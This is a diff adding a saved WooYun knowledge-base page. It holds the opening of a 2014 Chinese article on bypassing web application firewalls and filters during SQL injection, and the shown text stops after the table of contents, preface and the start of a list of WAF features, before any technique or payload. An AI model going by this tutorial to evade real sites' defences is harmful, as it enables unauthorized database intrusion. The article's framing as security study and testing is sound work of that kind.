@@ -1,0 +1,1863 @@
+
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>深入了解SQL注入绕过waf和过滤机制 | WooYun知识库</title>
+  <base href="/">
+  <meta name="fragment" content="!">
+  <meta name="description" content="深入了解SQL注入绕过waf和过滤机制">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <script>document.documentElement.className += ('ontouchstart' in window) ? ' touch' : ' no-touch'</script>
+  <script src="http://wooyun.b0.upaiyun.com/static/js/jquery.min.js"></script>
+  <script src="http://wooyun.b0.upaiyun.com/static/js/bootstrap.min.js"></script>
+  <link rel="stylesheet" href="http://wooyun.b0.upaiyun.com/static/css/95e46879.main.css">
+  <link rel="stylesheet" href="http://wooyun.b0.upaiyun.com/static/css/bootstrap.min.css">
+  <style type="text/css" id="syntaxhighlighteranchor"></style>
+
+<style>
+*:focus {
+  outline: none;
+}
+body {
+  margin: 0;
+  /* font-family: Helvetica, Arial, "Hiragino Sans GB", sans-serif; */
+  font-size: 14px;
+  line-height: 20px;
+  color: #555555;
+  background-color: white;
+}
+
+.comment-list{
+  padding-top: 10px;
+  border-top: 1px solid #d9d9d9;
+  margin: 0 auto;
+}
+
+.comment-list .new_comment{
+  margin-bottom: 46px;
+}
+.comment-list .comment-text {
+  padding: 10px;
+  border: 1px solid #d9d9d9;
+  font-family: "lucida grande", "lucida sans unicode", lucida, helvetica, "Hiragino Sans GB", "Microsoft YaHei", "WenQuanYi Micro Hei", sans-serif;
+  border-radius: 4px;
+}
+.comment-list textarea {
+  width: 100%;
+  height: 78px;
+  padding: 0;
+  margin: 0;
+  border: none;
+  box-shadow: none;
+  background: transparent;
+  resize: none;
+}
+
+.btn {
+  text-shadow: none;
+  border-radius: 4px;
+  box-shadow: none;
+  color: #555555;
+  border-color: whitesmoke;
+  background: whitesmoke;
+  border-color: #d5d5d5;
+  text-shadow: none;
+  border: 1px solid #cccccc;
+}
+
+.btn-info {
+  color: white;
+  border-color: #15a7f0;
+  background: #15a7f0;
+}
+
+.hotkey {
+  position: relative;
+  top: 2px;
+  margin-left: 11px;
+}
+
+.pull-right {
+  float: right;
+}
+
+.comment-list a {
+  color: #555555;
+  text-decoration: none;
+}
+.comment-list .fa {
+  display: inline-block;
+  font: normal normal normal 14px/1 FontAwesome;
+  font-size: inherit;
+  text-rendering: auto;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  transform: translate(0, 0);
+}
+.comment-list reply:before, .fa-reply:before {
+  content: "\f112";
+}
+
+.comment-list .note-comment {
+  padding: 0 0 10px;
+  margin-bottom: 20px;
+  border-bottom: 1px dashed #d9d9d9;
+}
+
+.comment-list .note-comment .avatar {
+  position: absolute;
+  margin-top: 3px;
+  width: 36px;
+  height: 36px;
+}
+
+.comment-list .note-comment .content {
+  margin-left: 45px;
+}
+.comment-list .note-comment .content .comment-header {
+  margin-bottom: 5px;
+}
+
+.comment-list .note-comment .content .author-name {
+  font-size: 14px;
+  color: #4094c7;
+}
+
+.comment-list .note-comment .content p a {
+  color: #4094c7;
+}
+.comment-list .comment-head{
+  margin-bottom: 10px;
+}
+.comment-list .comment-head input{
+  border-radius:4px;
+  border: 1px solid #cccccc;
+  margin-right: 10px;
+  margin-top: 10px;
+}
+
+.comment-list .comment-head img{
+  margin-bottom: 4px;
+}
+
+.content .author-link {
+   font-weight: 700;
+}
+
+.navbar-wooyun{
+  position: fixed;
+  width: 45px;
+  z-index: 1049;
+  height: 100%;
+  top: 0;
+  left: 0;
+  background: #2f2f2f;
+}
+
+.home-wooyun{
+  font-size: 18px;
+}
+
+.navbar-wooyun div{
+/*  font-size: 26px;*/
+  color: #999999;
+  text-align: center;
+}
+
+.navbar-wooyun a{
+  color: #999999;
+  display: block;
+  padding: 10px;
+  font-size: 16px;
+  line-height: 25px;
+  text-align: center;
+}
+
+.navbar-wooyun a:hover{
+  background-color: #e78170;
+  color: white;
+  text-shadow: 0 1px 0 #de533a;
+}
+
+.home-author-wooyun{
+//  position: absolute;
+  top: 0;
+  width: 100%;
+  padding-top: 5px;
+}
+
+.bottom-author-wooyun{
+  position: absolute;
+  bottom: 0;
+  width: 100%;
+  padding-bottom: 5px;
+}
+
+.navbar-title {
+  display: none;
+}
+
+.popover-content {
+  font-weight: 900;
+  width: 60;
+}
+
+.container:before {
+  content: '';
+}
+
+table {
+  border-top: #e0e0e0 1px solid;
+  border-left: #e0e0e0 1px solid;
+  border-collapse: separate;
+  border-spacing: 0;
+}
+
+table th, table td {
+  border-bottom: #e0e0e0 1px solid;
+  border-right: #e0e0e0 1px solid;
+  padding: 0 3px;
+}
+
+.column-about{
+  text-align: center;
+}
+
+@media screen and (max-width: 600px) {
+  .post-view .entry-content hr {
+    margin-left: -17px;
+    margin-right: -17px;
+  }
+
+  .comment-list .new_comment,
+  .comment-list .note-comment {
+    padding-left: 17px;
+    padding-right: 17px;
+  }
+}
+.weibo{
+    display: inline-block;
+    width: 18px;
+    height: 14px;
+    background: url(http://image.3001.net/images/new/icon-weibo.jpg);
+  }
+
+.navbar-mobile-show {
+  padding-top: 60px;
+}
+
+.navbar-mobile {
+  position: fixed;
+  z-index: 1000;
+  left: 0;
+  right: 0;
+  top: 0;
+  height: 60px;
+  background-color: #222;
+}
+
+.navbar-mobile-home {
+  display: block;
+  overflow: hidden;
+}
+
+.navbar-mobile-logo {
+  float: left;
+  width: 60px;
+  height: 60px;
+  margin: 0 10px;
+  background-image: url(data:image/png;base64,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);
+  background-repeat: no-repeat;
+  background-position: center;
+  background-size: 58px 47px;
+}
+
+.navbar-mobile-logo-text {
+  font-size: 20px;
+  font-weight: bold;
+  line-height: 60px;
+  color: #ddd;
+}
+</style>
+</head>
+<body ng-app="columnWebApp" ng-controller="AppCtrl" ng-class="pageClass">
+
+  <div class="navbar-wooyun">
+    <div class="home-author-wooyun">
+      <a href="/" data-toggle="popover" data-placement="right" data-content="首页" data-trigger="hover" data-original-title="" title="">
+        <span class="glyphicon glyphicon-home"></span>
+      </a>
+    </div>
+    <div class="home-author-wooyun">
+      <a href="/newsend" data-toggle="popover" data-placement="right" data-content="投稿" data-trigger="hover" data-original-title="" title="">
+        <span class="glyphicon glyphicon-pencil"></span>
+      </a>
+    </div>
+    <div class="bottom-author-wooyun">
+      <a href="/wp-login.php?action=logout&amp;redirect_to=http%3A%2F%2Fdrops.wooyun.org" data-toggle="popover" data-placement="right" data-content="登出" data-trigger="hover" data-original-title="" title="">
+        <span class="glyphicon glyphicon-log-out"></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="navbar-mobile hidden">
+    <a href="/" class="navbar-mobile-home">
+      <div class="navbar-mobile-logo"></div>
+      <div class="navbar-mobile-logo-text">乌云知识库</div>
+    </a>
+  </div>
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">深入了解SQL注入绕过waf和过滤机制</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" href="/author/r00tgrok" class="author name ng-binding">
+          r00tgrok</a>
+        <span class="bull">·</span>
+        <time title="2014/03/02 13:24" ui-time="" datetime="2014/03/02 13:24" class="published ng-binding ng-isolate-scope">2014/03/02 13:24</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        <p>知己知彼百战不殆 --孙子兵法</p>
+
+<p>[目录]</p>
+
+<pre><code>0x00 前言 
+0x01 WAF的常见特征 
+0x02 绕过WAF的方法 
+0x03 SQLi Filter的实现及Evasion 
+0x04 延伸及测试向量示例 
+0x05 本文小结 
+0x06 参考资料 
+</code></pre>
+
+<!--more-->
+
+<h2>0x00 前言</h2>
+
+<hr />
+
+<p>笔者前几天在做测试时输入攻击向量后页面发生了重定向甚至异常输入也是重定向怀疑其中有WAF在作怪。之前对WAF接触比较少纯粹是新手趁此科普了一下并查阅了一些绕过WAF的方法。所找到的资料中主要分为两类SQL注入和XSS绕过笔者SQL注入同样是新手因此集中了不少资料并进行整理和总结因此有本文的产生。</p>
+
+<p>目前能看到的绕过WAF的SQL注入技术大致有八、九种但是完整的、详细的内容却分布在互联网各个角落。另外我们谈绕过WAF其实也是谈如何绕过过滤机制如果在讨论bypass技术的时候明确一下现有的一些filter的实现及其evasion对于笔者这样的初学者来说是不是更好还有就是如果在文章后面可以提供一些测试向量提供思路和参考虽然内容看起来很杂但是也会比较方便呢?抱着这些想法尽管前人的分享已经比较充分了还是壮着胆自己进行总结这样更能适应自己的需求也可能更加适合一些朋友的需求。</p>
+
+<p>本文所讨论的技术大都几年以前就已经存在了不能保证每种方法在实际测试中都能生效另外为简便起见笔者对形如http://www.site.com的URL约定为z.com。</p>
+
+<h2>0x01 WAF的常见特征</h2>
+
+<hr />
+
+<p>之所以要谈到WAF的常见特征是为了更好的了解WAF的运行机制这样就能增加几分绕过的机会了。本文不对WAF做详细介绍只谈及几点相关的。</p>
+
+<p>总体来说WAF(Web Application Firewall)的具有以下四个方面的功能</p>
+
+<pre><code>1. 审计设备用来截获所有HTTP数据或者仅仅满足某些规则的会话 
+2. 访问控制设备用来控制对Web应用的访问既包括主动安全模式也包括被动安全模式 
